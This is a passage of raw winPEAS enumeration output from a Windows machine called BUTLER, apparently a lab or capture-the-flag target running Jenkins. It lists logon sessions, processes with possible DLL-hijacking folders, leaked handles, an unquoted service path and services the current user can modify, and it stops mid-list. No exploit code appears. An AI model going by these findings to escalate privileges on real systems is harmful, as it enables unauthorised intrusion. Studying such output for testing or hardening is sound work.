    Logon Time:                   10/19/2023 9:38:59 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Window Manager
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    DWM-1
    User Principal Name:          
    User SID:                     S-1-5-90-0-1

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     65578
    Logon Time:                   10/19/2023 9:38:59 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Window Manager
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    DWM-1
    User Principal Name:          
    User SID:                     S-1-5-90-0-1

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     997
    Logon Time:                   10/19/2023 9:38:58 PM
    Logon Type:                   Service
    Start Time:                   
    Domain:                       NT AUTHORITY
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    LOCAL SERVICE
    User Principal Name:          
    User SID:                     S-1-5-19

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     996
    Logon Time:                   10/19/2023 9:38:57 PM
    Logon Type:                   Service
    Start Time:                   
    Domain:                       WORKGROUP
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    BUTLER$
    User Principal Name:          
    User SID:                     S-1-5-20

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     32959
    Logon Time:                   10/19/2023 9:38:56 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Font Driver Host
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    UMFD-1
    User Principal Name:          
    User SID:                     S-1-5-96-0-1

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     32927
    Logon Time:                   10/19/2023 9:38:56 PM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Font Driver Host
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    UMFD-0
    User Principal Name:          
    User SID:                     S-1-5-96-0-0

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     999
    Logon Time:                   10/19/2023 9:38:55 PM
    Logon Type:                   0
    Start Time:                   
    Domain:                       WORKGROUP
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    BUTLER$
    User Principal Name:          
    User SID:                     S-1-5-18

   =================================================================================================



�����������������������������������͹ Processes Information �������������������������������������

����������͹ Interesting Processes -non Microsoft-
� Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                                                                                                         
    RuntimeBroker(3532)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    RuntimeBroker(388)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    sihost(1168)[C:\Windows\system32\sihost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: sihost.exe
   =================================================================================================                                                                   

    svchost(2140)[C:\Windows\system32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p
   =================================================================================================

    fontdrvhost(760)[C:\Windows\system32\fontdrvhost.exe] -- POwn: UMFD-1
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "fontdrvhost.exe"
   =================================================================================================                                                                   

    svchost(956)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k netsvcs -p
   =================================================================================================

    OneDrive(5092)[C:\Users\butler\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: butler
    Permissions: Administrators [AllAccess], butler [AllAccess]
    Possible DLL Hijacking folder: C:\Users\butler\AppData\Local\Microsoft\OneDrive (Administrators [AllAccess], butler [AllAccess])
    Command Line: "C:\Users\butler\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
   =================================================================================================                                                                   

    SearchIndexer(3116)[C:\Windows\system32\SearchIndexer.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\SearchIndexer.exe /Embedding
   =================================================================================================

    svchost(744)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k DcomLaunch -p
   =================================================================================================

    cmd(4092)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SYSTEM32 (Administrators [WriteData/CreateFiles])
    Command Line: cmd.exe
   =================================================================================================                                                                   

    svchost(1524)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================

    jenkins(2508)[C:\Program Files\Jenkins\jenkins.exe] -- POwn: butler -- isDotNet
    Permissions: butler [AllAccess], Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\Jenkins (Administrators [AllAccess], butler [AllAccess])
    Command Line: "C:\Program Files\Jenkins\jenkins.exe"
   =================================================================================================                                                                   

    WmiPrvSE(5460)[C:\Windows\system32\wbem\wmiprvse.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32\wbem (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wbem\wmiprvse.exe
   =================================================================================================                                                                   

    TrustedInstaller(928)[C:\Windows\servicing\TrustedInstaller.exe] -- POwn: SYSTEM
    Command Line: C:\Windows\servicing\TrustedInstaller.exe
   =================================================================================================                                                                   

    svchost(1912)[C:\Windows\system32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k appmodel -p
   =================================================================================================

    taskhostw(876)[C:\Windows\system32\taskhostw.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================                                                                   

    conhost(3124)[C:\Windows\system32\conhost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    cmd(1112)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SYSTEM32 (Administrators [WriteData/CreateFiles])
    Command Line: cmd.exe
   =================================================================================================                                                                   

    MicrosoftEdgeUpdate(1116)[C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe] -- POwn: SYSTEM
    Permissions: Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeUpdate (Administrators [AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c
   =================================================================================================                                                                   

    svchost(1896)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
   =================================================================================================

    RuntimeBroker(4056)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    conhost(4252)[C:\Windows\system32\conhost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    conhost(2472)[C:\Windows\system32\conhost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    svchost(932)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p
   =================================================================================================

    StartMenuExperienceHost(3848)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca                                                                                                                                                        
   =================================================================================================                                                                   

    taskhostw(4588)[C:\Windows\system32\taskhostw.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: taskhostw.exe
   =================================================================================================                                                                   

    RuntimeBroker(4184)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    winlogon(564)[C:\Windows\system32\winlogon.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: winlogon.exe
   =================================================================================================                                                                   

    cmd(3180)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SYSTEM32 (Administrators [WriteData/CreateFiles])
    Command Line: cmd.exe
   =================================================================================================                                                                   

    SearchFilterHost(5224)[C:\Windows\system32\SearchFilterHost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\system32\SearchFilterHost.exe" 0 808 812 820 8192 816 792 
   =================================================================================================                                                                   

    svchost(4816)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k netsvcs -p
   =================================================================================================

    WmiPrvSE(4616)[C:\Windows\system32\wbem\wmiprvse.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32\wbem (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wbem\wmiprvse.exe
   =================================================================================================                                                                   

    jusched(4220)[C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe] -- POwn: butler
    Permissions: Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Common Files\Java\Java Update (Administrators [AllAccess])
    Command Line: "C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe" 
   =================================================================================================                                                                   

    svchost(2840)[C:\Windows\system32\svchost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    svchost(2832)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
   =================================================================================================

    svchost(860)[C:\Windows\system32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k RPCSS -p
   =================================================================================================

    SkypeBackgroundHost(2828)[C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe] -- POwn: butler
    Command Line: "C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe" -ServerName:SkypeBackgroundHost
   =================================================================================================                                                                   

    svchost(1248)[C:\Windows\System32\svchost.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k NetworkService -p
   =================================================================================================

    fontdrvhost(752)[C:\Windows\system32\fontdrvhost.exe] -- POwn: UMFD-0
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "fontdrvhost.exe"
   =================================================================================================                                                                   

    winpeas(4408)[c:\Users\Public\Downloads\winpeas.exe] -- POwn: butler -- isDotNet
    Permissions: Administrators [AllAccess], Service [WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\Users\Public\Downloads (Administrators [AllAccess], Service [WriteData/CreateFiles])
    Command Line: winpeas.exe
   =================================================================================================                                                                   

    BootTime(2028)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] -- POwn: SYSTEM
    Permissions: Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])
    Command Line: "C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe"
   =================================================================================================                                                                   

    lsass(648)[C:\Windows\system32\lsass.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\lsass.exe
   =================================================================================================                                                                   

    MicrosoftEdgeUpdate(1780)[C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe] -- POwn: SYSTEM
    Permissions: Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeUpdate (Administrators [AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
   =================================================================================================                                                                   

    SearchProtocolHost(4980)[C:\Windows\system32\SearchProtocolHost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"         
   =================================================================================================                                                                   

    wlms(1236)[C:\Windows\system32\wlms\wlms.exe] -- POwn: SYSTEM
    Command Line: C:\Windows\system32\wlms\wlms.exe
   =================================================================================================                                                                   

    ctfmon(1432)[C:\Windows\system32\ctfmon.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "ctfmon.exe"
   =================================================================================================                                                                   

    TextInputHost(4976)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe" -ServerName:InputApp.AppX9jnwykgrccxc8by3hsrsh07r423xzvav.mca                                                                                                                                                                  
   =================================================================================================                                                                   

    java(2020)[C:\Program Files\Java\jre1.8.0_301\bin\java.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Program Files\Java\jre1.8.0_301\bin (Administrators [AllAccess])
    Command Line: "C:\Program Files\Java\jre1.8.0_301\bin\java.exe" -Xrs -Xmx256m -Dhudson.lifecycle=hudson.lifecycle.WindowsServiceLifecycle -jar "C:\Program Files\Jenkins\jenkins.war" --httpPort=8080 --webroot="C:\Users\butler\AppData\Local\Jenkins\war"                                                                               
   =================================================================================================                                                                   

    SearchApp(640)[C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
   =================================================================================================                                                                   

    WmiPrvSE(4972)[C:\Windows\system32\wbem\wmiprvse.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32\wbem (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\wbem\wmiprvse.exe
   =================================================================================================                                                                   

    dllhost(3000)[C:\Windows\system32\DllHost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    explorer(3200)[C:\Windows\Explorer.EXE] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================                                                                   

    svchost(2008)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k utcsvc -p
   =================================================================================================

    svchost(1612)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================

    MicrosoftEdgeUpdate(4172)[C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe] -- POwn: SYSTEM
    Permissions: Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files (x86)\Microsoft\EdgeUpdate (Administrators [AllAccess])
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler
   =================================================================================================                                                                   

    cmd(428)[C:\Windows\system32\cmd.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\system32\cmd.exe" 
   =================================================================================================                                                                   

    spoolsv(1804)[C:\Windows\System32\spoolsv.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\spoolsv.exe
   =================================================================================================                                                                   

    dwm(336)[C:\Windows\system32\dwm.exe] -- POwn: DWM-1
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: "dwm.exe"
   =================================================================================================                                                                   

    svchost(1604)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================

    svchost(3572)[C:\Windows\system32\svchost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
   =================================================================================================

    conhost(1404)[C:\Windows\system32\conhost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    VGAuthService(1772)[C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe] -- POwn: SYSTEM
    Permissions: Administrators [AllAccess]
    Possible DLL Hijacking folder: C:\Program Files\VMware\VMware Tools\VMware VGAuth (Administrators [AllAccess])
    Command Line: "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
   =================================================================================================                                                                   

    svchost(1008)[C:\Windows\System32\svchost.exe] -- POwn: SYSTEM
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
   =================================================================================================

    SppExtComObj(2184)[C:\Windows\system32\SppExtComObj.exe] -- POwn: NETWORK SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\SppExtComObj.exe -Embedding
   =================================================================================================

    TiWorker(3196)[C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.925_none_e76d4f6f260a683e\TiWorker.exe] -- POwn: SYSTEM
    Command Line: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.925_none_e76d4f6f260a683e\TiWorker.exe -Embedding
   =================================================================================================

    svchost(444)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
   =================================================================================================

    ShellExperienceHost(4932)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy (Administrators [WriteData/CreateFiles])
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================                                                                   

    svchost(492)[C:\Windows\system32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
   =================================================================================================

    conhost(2172)[C:\Windows\system32\conhost.exe] -- POwn: butler
    Possible DLL Hijacking folder: C:\Windows\system32 (Administrators [WriteData/CreateFiles])
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    svchost(988)[C:\Windows\System32\svchost.exe] -- POwn: LOCAL SERVICE
    Possible DLL Hijacking folder: C:\Windows\System32 (Administrators [WriteData/CreateFiles])
    Command Line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
   =================================================================================================


����������͹ Vulnerable Leaked Handlers
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
� Getting Leaked Handlers, it might take some time...
    Handle: 904(file)
    Handle Owner: Pid is 2508(jenkins) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Program Files\Jenkins\jenkins.err.log
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1096(file)
    Handle Owner: Pid is 2508(jenkins) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Program Files\Jenkins\jenkins.out.log
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 244(file)
    Handle Owner: Pid is 2020(java) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Users\butler\AppData\Local\Temp\hsperfdata_butler\2020
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 904(file)
    Handle Owner: Pid is 2508(jenkins) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Program Files\Jenkins\jenkins.err.log
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1096(file)
    Handle Owner: Pid is 2508(jenkins) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Program Files\Jenkins\jenkins.out.log
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 244(file)
    Handle Owner: Pid is 2020(java) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Users\butler\AppData\Local\Temp\hsperfdata_butler\2020
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 904(file)
    Handle Owner: Pid is 2508(jenkins) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Program Files\Jenkins\jenkins.err.log
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1096(file)
    Handle Owner: Pid is 2508(jenkins) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Program Files\Jenkins\jenkins.out.log
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 244(file)
    Handle Owner: Pid is 2020(java) with owner: butler
    Reason: WriteData/CreateFiles
    File Path: \Users\butler\AppData\Local\Temp\hsperfdata_butler\2020
    File Owner: BUILTIN\Administrators
   =================================================================================================



�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                                                                          
    Jenkins(CloudBees, Inc. - Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Auto - Running - isDotNet
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: butler [AllAccess], Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\Jenkins (Administrators [AllAccess], butler [AllAccess])
    Jenkins Automation Server
   =================================================================================================                                                                   

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    YOU CAN MODIFY THIS SERVICE: Start, AllAccess
    Possible DLL Hijacking in binary folder: C:\Windows\System32\OpenSSH (Administrators [WriteData/CreateFiles])
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                   

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools\VMware VGAuth (Administrators [AllAccess])
    Alias Manager and Ticket Service
   =================================================================================================                                                                   

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools (Administrators [AllAccess])
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================                                                                   

    VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin (Administrators [AllAccess])
    VMware Common Agent AMQP Communication Service
   =================================================================================================                                                                   

    VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin (Administrators [AllAccess])
    VMware Common Agent Management Agent Service
   =================================================================================================                                                                   

    WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])
    In order to optimize system performance,Wise Care 365 will calculate your system startup time.
   =================================================================================================                                                                   


����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    AJRouter: AllAccess
    ALG: AllAccess
    AppIDSvc: AllAccess
    Appinfo: AllAccess
    AppMgmt: AllAccess
    AppReadiness: AllAccess
    AppVClient: Start, AllAccess
    AppXSvc: Start, GenericExecute (Start/Stop)
    AssignedAccessManagerSvc: AllAccess
    AudioEndpointBuilder: AllAccess
    Audiosrv: AllAccess
    autotimesvc: AllAccess
    AxInstSV: AllAccess
    BDESVC: Start, ChangeConfig
    BFE: WriteDac
    BITS: AllAccess
    BrokerInfrastructure: WriteDac, Start
    BTAGService: AllAccess
    BthAvctpSvc: AllAccess
    bthserv: AllAccess
    camsvc: AllAccess
    CDPSvc: AllAccess
    CertPropSvc: ChangeConfig
    ClipSVC: Start, WriteDac
    COMSysApp: AllAccess
